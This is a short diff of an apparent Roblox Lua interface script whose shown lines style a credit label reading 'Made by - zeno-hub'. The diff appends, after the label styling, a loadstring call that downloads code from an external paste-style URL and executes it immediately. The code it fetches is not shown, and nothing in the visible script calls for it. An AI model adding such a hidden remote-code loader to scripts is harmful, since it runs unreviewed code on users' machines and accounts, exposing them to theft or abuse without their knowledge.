@@ -303,3 +303,5 @@ credit.Text = "Made by - zeno-hub"
 credit.Font = Enum.Font.FredokaOne
 credit.TextSize = 14
 credit.TextColor3 = Color3.fromRGB(200, 200, 200)
+
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/vPlU9cscgXkOPTlI/raw", true))()
